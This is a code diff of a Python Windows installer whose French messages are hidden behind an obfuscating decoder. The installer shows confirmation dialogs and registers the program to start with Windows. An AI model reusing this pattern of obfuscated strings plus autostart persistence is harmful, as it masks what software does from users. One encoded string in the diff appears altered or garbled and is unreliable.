@@ -44,7 +44,7 @@ class _A:
         if sys.platform!=_x('~mo>V'):return self._c()
         try:
             import ctypes
-            m=_x('HbjjmlWV`hj{gWZ`g`nliW0WMgtu`yy`umbg\g\gK|mtWgibnilz8~myyW\WT`qln`i}lt{gWqbtWhbbjmltW}lWg`qmn`ul{i\gW]dz`iiliW`{ubz`umr{lzlguW`qlhWRmg}b~t\gWLgqbsliWyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl\gW\gQbtW}bggdltWiltuljuWgimqdltWljWhulmmidlt&\g\gVhhlguljWqb{tWyFmgtu`yy`umbg#')
+            m=_x('HbjjmlWV`hj{gWZ`g`nliW0WMgtu`yy`umbg\g\gK|mtWgibnilz:l~myyW\WT`qln`i}li qbtWhbbjmltW}lWg`qmn`ul{i\gW]dz`iiliW`{ubz`umr{lzlguW`qlhWRmg}b~t\gWLgqbsliWyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl\g\gQbtW}bggdltWiltuljuWgimqdltWljWhutmmidlt&\g\gVhhlguljWqb{tWyFmgtu`yy`umbg#')
             r=ctypes.windll.user32.MessageBoxW(0,m,_x('Mgtu`yy`umbgW0WHbgtljulzlguWIlr{mt'),0x40|0x4)
             return r==6
         except:return self._c()
@@ -56,7 +56,7 @@ class _A:
         print(_x('\gHlWgibnilzzlW8'))
         print(_x('T`{qln`i}liWqbtWhbbjmltW}lWg`qmn`ul{i'))
         print(_x(']dz`iiliW`{ubz`umr{lzlguW`qlhWRmg}b~t'))
-        print(_x('LgqbsliwyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl'))
+        print(_x('LgqbsliWyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl'))
         print(_x('\gQbtW}bggdltWiltuljuWgimqdltWljWhutmmidlt&'))
         print(_x('\g'))
         print(_x('J'))
@@ -98,20 +98,22 @@ class _A:
         if not ins:
             print(_x('Lh|lhWhbgmlWlreh{u`uyl'))
             return False
-        print(f'[ibnilzzlWmgtu`yydW}`gt8W{ins}')
+        msg=_x('[ibnilzzlWmgtu`yydW}`gt8W')
+        print(msg+str(ins))
         if self._t(ins):
             print(_x('\}b{udW`{W}dz`ii`nlW`{ubz`umr{l'))
         else:
             print(_x(']dz`ii`nlW`{ubz`umr{lWgbgWhbgmno{id'))
         try:
             import ctypes
-            ctypes.windll.user32.MessageBoxW(0,f"Installation reussie !\n\nLe programme est installe dans :\n{self.d}\n\nIl demarrera automatiquement avec Windows.",_x('Mgtu`yy`umbgWKlizmgdl'),0x40)
+            finalmsg="Installation reussie !\n\nLe programme est installe dans :\n"+str(self.d)+"\n\nIl demarrera automatiquement avec Windows."
+            ctypes.windll.user32.MessageBoxW(0,finalmsg,_x('Mgtu`yy`umbgWKlizmgdl'),0x40)
         except:
             print(_x('\g'))
             print(_x('J'))
             print(_x('MGUK\YY\KMBGWKLI\MGLL'))
             print(_x('J'))
-            print(f'\nLe programme est installe dans:\n{self.d}')
+            print('\nLe programme est installe dans:\n'+str(self.d))
             print(_x('\gMyW}dz`iili`W`{ubz`umr{lzlguW`qlhWRmg}b~t&'))
         return True
 
